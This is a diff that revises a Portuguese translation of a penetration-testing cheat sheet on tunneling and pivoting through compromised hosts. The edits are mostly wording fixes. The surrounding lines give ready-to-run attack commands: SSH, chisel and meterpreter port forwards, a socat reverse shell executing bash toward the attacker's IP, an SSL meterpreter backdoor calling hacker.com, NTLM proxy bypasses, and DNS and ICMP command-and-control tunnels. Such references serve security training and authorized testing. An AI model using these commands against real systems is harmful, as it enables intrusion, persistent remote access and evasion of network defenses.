@@ -10,7 +10,7 @@ ssh -Y -C <user>@<ip> # -Y é menos seguro, mas mais rápido que -X
 
 ### Local Port2Port
 
-Abrir uma nova porta no servidor SSH -> Other port
+Abrir uma nova porta no servidor SSH -> Outra porta
 
 ```bash
 ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Porta local 1521 acessível na porta 10521 de qualquer lugar
@@ -22,18 +22,18 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Porta remota 1521 acessível n
 
 ### Port2Port
 
-Porta Local -> Host comprometido (SSH) -> Third_box:Port
+Porta Local -> Host comprometido (SSH) -> Terceira_maquina:Porta
 
 ```bash
 ssh -i ssh_key <usuario>@<ip_comprometido> -L <porta_do_atacante>:<ip_da_vitima>:<porta_remota> [-p <porta_ssh>] [-N -f]  #Dessa forma, o terminal ainda está em seu host
 
 #Exemplo
-sudo ssh -L 631:<ip_da_vitima>:631 -N -f -l <usuario> <ip_comprometido>
+sudo ssh -L 631:<ip_da_vitima>:631 -N -f -l <usuário> <ip_comprometido>
 ```
 
 ### Port2hostnet (proxychains)
 
-Porta Local -> Host comprometido (SSH) -> Wherever
+Porta Local -> Host comprometido (SSH) -> Qualquer lugar
 
 ```bash
 ssh -f -N -D <porta_do_atacante> <usuario>@<ip_comprometido> #Tudo enviado para a porta local irá ser redirecionado para o servidor comprometido (uso como proxy)
@@ -41,7 +41,7 @@ ssh -f -N -D <porta_do_atacante> <usuario>@<ip_comprometido> #Tudo enviado para 
 
 ### Túnel - VPN
 
-Você precisa de root em ambos os dispositivos (já que criará novas interfaces) e a configuração do sshd deve permitir o login de root:
+Você precisa de root em ambos os dispositivos \(já que criará novas interfaces\) e a configuração do sshd deve permitir o login de root:
 
 `PermitRootLogin yes`  
 `PermitTunnel yes`
@@ -52,7 +52,7 @@ ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ```
 
-Ativando o encaminhamento do lado do servidor
+Ativando o forwarding do lado do servidor
 
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -67,8 +67,8 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-Você pode **encapsular** via **ssh** todo o **tráfego** para uma **sub-rede** por meio de um host.
-Exemplo, encaminhando todo o tráfego que vai para 10.10.10.0/24
+Você pode **tunelar** via **ssh** todo o **tráfego** para uma **sub-rede** por meio de um host.
+Exemplo, tunelando todo o tráfego que vai para 10.10.10.0/24
 
 ```bash
 pip install sshuttle
@@ -79,24 +79,24 @@ sshuttle -r user@host 10.10.10.10/24
 
 ### Port2Port
 
-Porta Local -> Host comprometido (active session) -> Third_box:Port
+Porta Local -> Host comprometido \(sessão ativa\) -> Terceira_maquina:Porta
 
 ```bash
 # Inside a meterpreter session
 portfwd add -l <porta_do_atacante> -p <porta_remota> -r <host_remoto>
 ```
 
-### Port2hostnet (proxychains)
+### Port2hostnet \(proxychains\)
 
 ```bash
 background# meterpreter session
-route add <ip_vitima> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
+route add <ip_vitima> <máscara_de_rede> <sessão> # (ex: route add 10.10.10.14 255.255.255.0 8)
 use auxiliary/server/socks_proxy
 run #Proxy port 1080 by default
 echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 
-Another way:
+Outra forma:
 
 ```bash
 background #meterpreter session
@@ -115,7 +115,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Você precisa fazer upload de um arquivo web no túnel: ashx\|aspx\|js\|jsp\|php\|php\|jsp
+Você precisa fazer upload de um arquivo web de túnel: ashx\|aspx\|js\|jsp\|php\|php\|jsp
 
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
@@ -123,15 +123,15 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 
 ## Chisel
 
-Você pode baixá-lo na página de lançamentos do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
-Você precisa usar a **mesma versão para cliente e servidor**
+Você pode baixá-lo na página de releases do [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
+Você precisa usar a **mesma versão para o cliente e o servidor**
 
 ### socks
 
 ```bash
 ./chisel server -p 8080 --reverse #Server
 ./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
-#E agora você pode usar proxychains com a porta 1080 (default)
+#E agora você pode usar proxychains com a porta 1080 (padrão)
 ```
 
 ### Port forwarding
@@ -190,13 +190,13 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
 ```
 
-### Port2Port through socks
+### Port2Port via socks
 
 ```bash
 socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
 
-### Meterpreter through SSL Socat
+### Meterpreter via Socat com SSL
 
 ```bash
 #Crie o backdoor do meterpreter na porta 3333 e inicie o listener do msfconsole nessa porta
@@ -205,10 +205,10 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 
 ```bash
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
-#Execute the meterpreter
+#Execute o meterpreter
 ```
 
-Você pode ignorar um **proxy não autenticado** executando esta linha em vez da última no console da vítima:
+Você pode burlar um **proxy não autenticado** executando esta linha em vez da última no console da vítima:
 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
@@ -216,7 +216,7 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat Tunnel
+### Túnel Socat com SSL
 
 **/bin/sh console**
 
@@ -236,9 +236,9 @@ attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=cli
 victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
 ```
 
-### Remote Port2Port
+### Port2Port Remoto
 
-Conecte a porta SSH local (22) à porta 443 do host não autorizado
+Conecte a porta SSH local \(22\) à porta 443 do host não autorizado
 
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
@@ -248,20 +248,20 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Conecta-se ao SSH da 
 
 ## Plink.exe
 
-É como uma versão de console do PuTTY (as opções são muito semelhantes a um cliente ssh).
+É como uma versão de console do PuTTY \(as opções são muito semelhantes a um cliente ssh\).
 
 Como este binário será executado na vítima e é um cliente ssh, precisamos abrir nossa porta e serviço ssh para que possamos ter uma conexão reversa. Portanto, para encaminhar apenas uma porta acessível localmente para uma porta em nossa máquina:
 
 ```bash
-echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
-echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
+echo y | plink.exe -l <nosso_username_valido> -pw <senha_valida> [-p <porta>] -R <porta_no_nosso_host>:<proximo_ip>:<porta_final> <seu_ip>
+echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Porta local 9090 para a porta 9090 externa
 ```
 
-## NTLM proxy bypass
+## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**
 
-**OpenVPN** também pode ignorá-lo definindo estas opções no arquivo de configuração:
+**OpenVPN** também pode burlá-lo definindo estas opções no arquivo de configuração:
 
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
@@ -271,7 +271,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ele se autentica em um proxy e vincula uma porta localmente, que é encaminhada ao serviço externo que você especificar. Então você pode usar a ferramenta de sua escolha por meio desta porta.
+Ele se autentica em um proxy e faz bind em uma porta localmente, que é encaminhada ao serviço externo que você especificar. Então você pode usar a ferramenta de sua escolha por meio desta porta.
 
 Exemplo que faz o forward da porta 443
 
@@ -284,7 +284,7 @@ Tunnel 2222:<attackers_machine>:443
 ```
 
 Agora, se você definir, por exemplo na vítima o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele por meio da porta 2222 do invasor.
-Você também pode usar o **meterpreter** para se conecta ao localhost:443 e o invasor está escutando na porta 2222.
+Você também pode usar o **meterpreter** que se conecta no localhost:443 e o invasor está escutando na porta 2222.
 
 ## YARP
 
@@ -296,15 +296,15 @@ Um proxy reverso criado pela Microsoft. Você pode encontrá-lo aqui: [https://g
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-O root é necessário em ambos os sistemas para criar adaptadores de túnel e dados de túnel entre eles usando consultas DNS.
+O root é necessário em ambos os sistemas para criar adaptadores tun e tunela dados entre eles usando consultas DNS.
 
 ```text
-attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
-victim> iodine -f -P P@ssw0rd tunneldomain.com -r
-#You can see the victim at 1.1.1.2
+atacante> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
+vítima> iodine -f -P P@ssw0rd tunneldomain.com -r
+#Você pode ver a vítima no 1.1.1.2
 ```
 
-O túnel vai ser muito lento. Você pode criar uma conexão SSH compactada por meio deste túnel usando:
+O túnel vai ser muito lento. Você pode criar uma conexão SSH comprimida por meio deste túnel usando:
 
 ```text
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
@@ -315,41 +315,41 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 Estabeleça um canal C&C por meio do DNS. Não precisa de privilégios de root.
 
 ```bash
-attacker> ruby ./dnscat2.rb tunneldomain.com
-victim> ./dnscat2 tunneldomain.com
+atacante> ruby ./dnscat2.rb tunneldomain.com
+vítima> ./dnscat2 tunneldomain.com
 ```
 
-**Port forwarding with dnscat**
+**Tunelamento de portas com dnscat**
 
 ```bash
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
 
-#### Change proxychains DNS
+#### Troque o DNS do Proxychains
 
-Proxychains intercepta a chamada libc `gethostbyname` e canaliza a solicitação DNS tcp através do proxy socks. Por **padrão** o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um ambiente **Windows**, poderá definir o IP do **controlador de domínio**.
+o Proxychains intercepta a chamada `gethostbyname` da libc e tunela a solicitação DNS tcp através do proxy socks. Por **padrão** o servidor **DNS** que o proxychains usa é **4.2.2.2** \(hardcoded\). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **Ambiente Windows**, você pode definir o IP do **domain controller**.
 
-## Tunnels in Go
+## Túneis em Go
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunneling
+## Tunelamento ICMP
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)  
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-O root é necessário em ambos os sistemas para criar adaptadores de túnel e dados de túnel entre eles usando solicitações do ICMP.
+O root é necessário em ambos os sistemas para criar adaptadores tun e tunela dados entre eles usando requests echo do ICMP.
 
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
-ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
+ping 1.1.1.100 #Após uma conexão bem sucedida, A vítima estara acessível pelo ip 1.1.1.100
 ```
 
-## Other tools to check
+## Outras ferramentas para verificar
 
 * [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
 * [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
